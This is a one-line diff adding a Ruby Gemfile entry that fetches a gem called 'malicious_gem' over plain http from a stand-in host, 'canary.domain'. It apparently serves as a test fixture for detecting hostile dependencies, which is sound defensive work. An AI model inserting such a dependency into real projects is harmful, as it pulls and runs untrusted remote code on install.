@@ -1,0 +1,1 @@
+gem 'malicious_gem', git: 'http://canary.domain/malicious_code'
